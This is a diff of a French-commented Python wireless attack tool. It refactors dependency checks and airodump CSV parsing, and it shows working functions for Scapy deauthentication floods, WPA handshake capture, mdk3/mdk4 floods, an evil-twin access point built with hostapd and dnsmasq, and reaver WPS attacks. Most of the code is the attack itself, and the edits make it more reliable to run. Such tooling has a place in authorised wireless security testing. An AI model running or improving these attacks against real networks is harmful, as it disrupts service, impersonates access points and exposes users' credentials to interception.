@@ -3,6 +3,8 @@ import subprocess, os, csv, time, sys, signal
 import glob as glob_module
 from pathlib import Path
 from threading import Thread
+import shutil
+import re
 # Import scapy avec gestion d'erreur - IMPORT SÉLECTIF
 try:
     from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
@@ -57,7 +59,7 @@ def print_banner():
 def check_dependencies():
     deps = {
         "airmon-ng": "aircrack-ng",
-        "airodump-ng": "aircrack-ng", 
+        "airodump-ng": "aircrack-ng",
         "aireplay-ng": "aircrack-ng",
         "mdk3": "mdk3 (optionnel)",
         "mdk4": "mdk4 (optionnel)",
@@ -69,7 +71,7 @@ def check_dependencies():
     optional_missing = []
     
     for cmd, pkg in deps.items():
-        if subprocess.run(["which", cmd], capture_output=True).returncode != 0:
+        if shutil.which(cmd) is None:
             if "optionnel" in pkg:
                 optional_missing.append(f"{cmd} ({pkg})")
             else:
@@ -92,7 +94,7 @@ def check_dependencies():
 # === Nettoyer les processus et fichiers ===
 def cleanup():
     global active_processes
-    for proc in active_processes:
+    for proc in list(active_processes):
         try:
             proc.terminate()
             proc.wait(timeout=3)
@@ -116,7 +118,7 @@ def clean_scan_files():
     for file in glob_module.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
         try:
             os.remove(file)
-        except Exception as e:
+        except Exception:
             pass  # Ignorer les erreurs silencieusement
 
 # === Récupérer les interfaces Wi-Fi ===
@@ -125,9 +127,13 @@ def get_interfaces():
         result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
         interfaces = []
         for line in result.splitlines():
-            if "IEEE 802.11" in line:
-                iface = line.split()[0]
-                interfaces.append(iface)
+            if "IEEE 802.11" in line or "Mode:Monitor" in line or "ESSID" in line:
+                parts = line.split()
+                if parts:
+                    iface = parts[0]
+                    # filtration basique pour éviter "lo" etc
+                    if iface not in interfaces and not iface.startswith("lo"):
+                        interfaces.append(iface)
         return interfaces
     except Exception as e:
         print(f"{RED}[-] Erreur lors de la récupération des interfaces: {e}{RESET}")
@@ -147,8 +153,8 @@ def enable_monitor_mode(interface):
             interface = interface[:-3]
 
         print(f"{GREEN}[+] Activation du mode monitor sur {interface}...{RESET}")
-        result = subprocess.run(["airmon-ng", "start", interface], 
-                              capture_output=True, text=True)
+        subprocess.run(["airmon-ng", "start", interface], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         # Attendre que l'interface soit prête
         time.sleep(2)
@@ -218,43 +224,66 @@ def parse_scan_results(filename):
         with open(filename, "r", encoding="utf-8", errors="ignore") as f:
             reader = csv.reader(f)
             section = 0
+            seen_bssids = set()
             for row in reader:
                 if len(row) < 1:
                     continue
-                if row[0].strip().startswith("BSSID"):
+                first = row[0].strip()
+                if first.startswith("BSSID"):
                     section = 1
                     continue
-                elif row[0].strip().startswith("Station MAC"):
+                elif first.startswith("Station MAC") or first.startswith("Last beacon"):
                     section = 2
                     continue
 
-                if section == 1 and len(row) > 13:
-                    essid = row[13].strip()
+                if section == 1:
+                    # Quelques fichiers CSV aiordump ont un layout variable.
+                    # L'ESSID commence normalement à l'index 13, mais on assemble toutes les colonnes restantes
+                    if len(row) < 4:
+                        continue
                     bssid = row[0].strip()
                     if not bssid or bssid == "BSSID":
                         continue
+                    if bssid in seen_bssids:
+                        continue
+                    seen_bssids.add(bssid)
+
+                    channel = row[3].strip() if len(row) > 3 else "?"
+                    if not channel or not channel.isdigit():
+                        channel = "?"
+
+                    # Power et encryption : indices parfois différents ; on protège l'accès
+                    power = row[8].strip() if len(row) > 8 and row[8].strip() != "" else "-100"
+                    enc = row[5].strip() if len(row) > 5 else "?"
+                    # ESSID : assembler toutes les colonnes à partir de 13 pour éviter la casse quand l'ESSID contient des virgules
+                    essid = ""
+                    if len(row) >= 14:
+                        essid = ",".join([c for c in row[13:] if c is not None]).strip()
+                    elif len(row) > 13:
+                        essid = row[13].strip()
+                    else:
+                        essid = "<hidden>"
+
                     if essid == "":
                         essid = "<hidden>"
                     
-                    # Vérifier que le canal est valide
-                    channel = row[3].strip()
-                    if not channel or not channel.isdigit():
-                        channel = "?"
-                        
                     aps.append({
                         "bssid": bssid,
                         "channel": channel,
                         "essid": essid,
-                        "power": row[8].strip(),
-                        "encryption": row[5].strip() if len(row) > 5 else "?"
+                        "power": power,
+                        "encryption": enc
                     })
-                    clients[bssid] = []
+                    clients.setdefault(bssid, [])
                     
-                elif section == 2 and len(row) > 5:
+                elif section == 2:
+                    if len(row) < 6:
+                        continue
                     client_mac = row[0].strip()
                     ap_mac = row[5].strip()
                     if client_mac and ap_mac and ap_mac in clients:
-                        clients[ap_mac].append(client_mac)
+                        if client_mac not in clients[ap_mac]:
+                            clients[ap_mac].append(client_mac)
     except Exception as e:
         print(f"{RED}[-] Erreur lors de la lecture du fichier: {e}{RESET}")
     
@@ -275,7 +304,7 @@ def print_ap_list(aps, clients):
         client_count = len(clients.get(ap['bssid'], []))
         
         print(f"{YELLOW}{i+1:<5}{RESET} "
-              f"{CYAN}{ap['essid']:<25}{RESET} "
+              f"{CYAN}{ap['essid'][:24]:<25}{RESET} "
               f"{YELLOW}{ap['channel']:<4}{RESET} "
               f"{power_color}{ap['power']:<6}{RESET} "
               f"{BLUE}{ap['encryption']:<12}{RESET} "
@@ -290,6 +319,14 @@ def set_channel(interface, channel):
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except:
         pass
+
+# helper for filename sanitization
+def sanitize_filename(s):
+    s = s.strip()
+    # keep letters, numbers, dash, underscore and space -> replace others with _
+    s = re.sub(r'[^A-Za-z0-9 _-]', '_', s)
+    s = s.replace(' ', '_')
+    return s[:64]
 
 # === 1. Attaque de déauthentification (Scapy) ===
 def attack_deauth(ap, clients, interface):
@@ -361,12 +398,17 @@ def attack_deauth(ap, clients, interface):
                 for pkt in packets:
                     if stop_attack:
                         break
-                    sendp(pkt, iface=interface, verbose=0)
+                    try:
+                        sendp(pkt, iface=interface, verbose=0)
+                    except Exception as e:
+                        print(f"{RED}[-] Erreur sendp: {e}{RESET}")
+                        stop_attack = True
+                        break
                     packet_count += 1
                 time.sleep(0.1)
                 
                 # Afficher progression toutes les 500 paquets
-                if packet_count % 500 == 0:
+                if packet_count and packet_count % 500 == 0:
                     elapsed = int(time.time() - (end_time - duration))
                     remaining = max(0, duration - elapsed)
                     print(f"{YELLOW}[*] {packet_count} paquets envoyés | Temps restant: {remaining}s{RESET}")
@@ -399,7 +441,8 @@ def capture_handshake(ap, clients, interface):
     # Créer le dossier de handshakes
     Path(HANDSHAKE_DIR).mkdir(exist_ok=True)
     
-    output_file = f"{HANDSHAKE_DIR}/{ap['essid'].replace(' ', '_')}_{ap['bssid'].replace(':', '')}"
+    safe_name = sanitize_filename(ap['essid'])
+    output_file = f"{HANDSHAKE_DIR}/{safe_name}_{ap['bssid'].replace(':', '')}"
     
     set_channel(interface, ap['channel'])
     
@@ -449,9 +492,9 @@ def attack_flood(ap, interface):
     
     # Vérifier mdk4 d'abord (plus stable)
     mdk_cmd = None
-    if subprocess.run(["which", "mdk4"], capture_output=True).returncode == 0:
+    if shutil.which("mdk4") is not None:
         mdk_cmd = "mdk4"
-    elif subprocess.run(["which", "mdk3"], capture_output=True).returncode == 0:
+    elif shutil.which("mdk3") is not None:
         mdk_cmd = "mdk3"
     else:
         print(f"{RED}[-] mdk3/mdk4 n'est pas installé !{RESET}")
@@ -497,19 +540,28 @@ def attack_evil_twin(ap, interface):
     print(f"\n{GREEN}[+] Création d'un Evil Twin pour {ap['essid']}{RESET}")
     
     # Vérifier les dépendances
-    if subprocess.run(["which", "hostapd"], capture_output=True).returncode != 0:
+    if shutil.which("hostapd") is None:
         print(f"{RED}[-] hostapd n'est pas installé !{RESET}")
         return
-    if subprocess.run(["which", "dnsmasq"], capture_output=True).returncode != 0:
+    if shutil.which("dnsmasq") is None:
         print(f"{RED}[-] dnsmasq n'est pas installé !{RESET}")
         return
     
     if ap['channel'] == "?":
         print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
         return
-    
+
+    # Si interface en mode monitor, repasser à l'interface normale automatiquement
+    iface_for_hostapd = interface
+    if interface.endswith("mon"):
+        print(f"{YELLOW}[!] Interface {interface} détectée en mode monitor, arrêt du mode monitor pour hostapd...{RESET}")
+        subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        iface_for_hostapd = interface[:-3]
+        # Donner un peu de temps pour que l'interface revienne en managed
+        time.sleep(1)
+
     # Configuration hostapd
-    hostapd_conf = f"""interface={interface}
+    hostapd_conf = f"""interface={iface_for_hostapd}
 driver=nl80211
 ssid={ap['essid']}
 hw_mode=g
@@ -531,7 +583,7 @@ rsn_pairwise=CCMP
         return
     
     # Configuration dnsmasq
-    dnsmasq_conf = f"""interface={interface}
+    dnsmasq_conf = f"""interface={iface_for_hostapd}
 dhcp-range=192.168.1.10,192.168.1.100,12h
 dhcp-option=3,192.168.1.1
 dhcp-option=6,192.168.1.1
@@ -548,7 +600,7 @@ log-dhcp
         return
     
     print(f"{CYAN}[*] Configuration de l'interface...{RESET}")
-    subprocess.run(["ifconfig", interface, "192.168.1.1", "netmask", "255.255.255.0"],
+    subprocess.run(["ifconfig", iface_for_hostapd, "192.168.1.1", "netmask", "255.255.255.0"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
     print(f"{GREEN}[+] Démarrage de hostapd...{RESET}")
@@ -578,7 +630,7 @@ def attack_wps(ap, interface):
     print(f"\n{GREEN}[+] Attaque WPS sur {ap['essid']}{RESET}")
     
     # Vérifier si reaver est installé
-    if subprocess.run(["which", "reaver"], capture_output=True).returncode != 0:
+    if shutil.which("reaver") is None:
         print(f"{RED}[-] Reaver n'est pas installé !{RESET}")
         print(f"{ORANGE}[!] Installez-le avec: apt install reaver{RESET}")
         return
